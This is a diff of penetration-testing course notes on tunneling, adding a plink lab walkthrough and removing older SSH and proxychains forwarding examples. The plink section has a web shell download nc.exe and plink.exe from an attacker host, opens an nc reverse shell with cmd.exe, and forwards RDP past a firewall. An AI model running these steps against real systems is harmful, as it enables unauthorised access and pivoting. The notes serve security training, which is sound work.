@@ -868,6 +868,91 @@ postgres=#
 ```
 
 
+## plink
+
+- Command-line counterpart to Putty
+- Doesn't have remote dynamic port forwarding (verify)
+
+#### Scenario
+- Compromise MULTISERVER03 through the web application
+- Drop a _web shell_ on it, and gain a reverse shell using that.
+- Use to previously discovered creds connect to the RDP service
+	- This is blocked by the firewall, so we can't connect directly.
+
+#### Execution
+- Get an interactive reverse shell from MULTISERVER03
+	- From our initial exploitation, we uploaded a basic web shell at **/umbraco/forms.aspx**.
+	- Browse to the URL and run whatever Windows commands wanted (will be run as the _iis apppool\\defaultapppool_ user).
+
+- Start webserver on Kali to host **nc.exe** and **plink.exe**
+```bash
+sudo systemctl start apache2
+
+find / -name nc.exe 2>/dev/null
+	/usr/share/windows-resources/binaries/nc.exe
+
+sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
+
+find / -name plink.exe 2>/dev/null
+	/usr/share/windows-resources/binaries/plink.exe
+
+sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
+```
+
+- Use MULTISERVER03 web shell to download **nc.exe** and **plink.exe** and then use to send a reverse shell back to Kali.
+```bash
+powershell wget -Uri http://192.168.45.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
+powershell wget -Uri http://192.168.45.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
+```
+
+- Set up **nc** listener on Kali
+```bash
+nc -nlvp 4446
+```
+\
+- Using webshell, execute **nc** for reverse shell
+```bash
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.4 4446
+```
+
+- Set up Plink with a remote port forward in order to access the MULTISERVER03 RDP port from Kali
+```bash
+C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+The host key is not cached for this server:
+  192.168.118.4 (port 22)
+You have no guarantee that the server is the computer
+you think it is.
+The server's ssh-ed25519 key fingerprint is:
+  ssh-ed25519 255 SHA256:q1QQjIxHhSFXfEIT4gYrRF+zKr0bcLMOJljoINxThxY
+If you trust this host, enter "y" to add the key to
+PuTTY's cache and carry on connecting.
+If you want to carry on connecting just once, without
+adding the key to the cache, enter "n".
+If you do not trust this host, press Return to abandon the
+connection.
+Store key in cache? (y/n, Return cancels connection, i for more info) y
+Using username "kali".
+Linux kali 5.16.0-kali7-amd64 #1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01) x86_64
+
+The programs included with the Kali GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Aug 21 15:50:39 2022 from 192.168.50.64
+kali@kali:~$ 
+```
+	- After the **-R** option
+		- The socket to open on the Kali SSH server
+		- The RDP server port on the loopback interface of MULTISERVER03 that we want to forward packets to.
+	- We will also pass the username (**-l**) and password (**-pw**) directly on the command line.
+
+
+
+
+
 # Removed from course
 
 ### RINETD:
@@ -954,115 +1039,10 @@ sudo vim /etc/samba/smb.conf
   
 sudo /etc/init.d/smbd restart
 ```
-
-Tunnel:  
-```bash
-sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
-```
-
-
-Now (assuming everything works), use the **[smbclient](Tools.md#smbclient)** utility to access the shares:  
-```bash
-smbclient -L 127.0.0.1 -U Administrator  
-	Unable to initialize messaging context  
-	Enter WORKGROUP\Administrators password:   
-  
-	Sharename       Type      Comment  
-	---------       ----      -------  
-	ADMIN$          Disk      Remote Admin  
-	C$              Disk      Default share  
-	Data            Disk        
-	IPC$            IPC       Remote IPC  
-	NETLOGON        Disk      Logon server share   
-	SYSVOL          Disk      Logon server share   
-	Reconnecting with SMB1 for workgroup listing.  
-  
-	Server               Comment  
-	---------            -------  
-  
-	Workgroup            Master  
-	---------            -------
-```
-
-
-##### REMOTE:  
-  
-Port is opened on the remote side of the connection & traffic sent to that port is forwarded to our local machine (machine initiating the SSH client)  
-  
-Scenario:  
-	Access to a non-root shell on a Linux client on internal network. On this compromised machine, we discover MySQL server running on 3306  
-	Firewall's blocking inbound SSH connections but allows outbound SSH  
-	We _can_ SSH out from this server to our attack machine.  
-  
-Use **-R** to signify remote forwarding:  
-Ex:  (student@debian)
-```bash
-ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
-```
-	10.11.0.4:2221 - Attack box (kali)  
-	127.0.0.1:3306 - Victim's localhost  
-  
-Results:  (kali) 
-```bash
-ss -antp | grep "2221"  
-	LISTEN   0   128    127.0.0.1:2221     0.0.0.0:*      users:(("sshd",pid=2294,fd=9))  
-	LISTEN   0   128      [::1]:2221         [::]:*       users:(("sshd",pid=2294,fd=8))  
-      
-sudo nmap -sS -sV 127.0.0.1 -p 2221  
-  
-	Nmap scan report for localhost (127.0.0.1)  
-	Host is up (0.000039s latency).  
-  
-	PORT     STATE SERVICE VERSION  
-	2221/tcp open  mysql   MySQL 5.5.5-10.1.26-MariaDB-0+deb9u1  
-  
-	Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds 
-```
-  
  
-##### DYNAMIC:  
-  
-Similar scenario to local:  
-	Compromised an internal Linux client, elevated privs, no in/out-bound FW blocking, but - this has 2 nic's & is connected to 2 separate networks (10.11.*.* & 192.168.*.*)  
-	Rather than targetting one IP & port, we want to target multiple ports.  
-  
-Use **-D** to signify dynamic forwarding & create a SOCKS4 proxy:  
-Ex:  
-```bash
-sudo ssh -N -D 127.0.0.1:9050 student@10.11.0.128
-```
-	127.0.0.1:8080 - Attack box (kali)  
-	student@10.11.0.128 - Pivot box  
-  
-  
-We still must direct our reconnaissance and attack tools to use this proxy.  
-  
-[proxychains](proxychains.md)  
-  
-Add SOCKS4 proxy to _/etc/proxychains4.conf_, and run all desired commands through it:  
-```bash
-vim /etc/proxychains4.conf  
-	...  
-	[ProxyList]  
-	# add proxy here ...  
-	# meanwile  
-	# defaults set to "tor"  
-	socks4  127.0.0.1 9050  
-  
-sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110  
-	Starting Nmap 7.60 ( https://nmap.org ) at 2019-04-19 18:18 EEST  
-	|S-chain|-<>-127.0.0.1:9050-<><>-192.168.1.110:443-<--timeout  
-	...  
-	|S-chain|-<>-127.0.0.1:9050-<><>-192.168.1.110:445-<><>-OK  
-	...
-```
 
-
-  
 ### Plink.exe
 
-Tunneling on Windows.  
-  
 Scenario:  
 	We've gained access to a Windows10 machine during our assessment through a vuln in Sync Breeze & have obtained a SYSTEM-level reverse shell.  
 	During enum (**netstat -anpb TCP**) we discover MySQL running on 3306.  
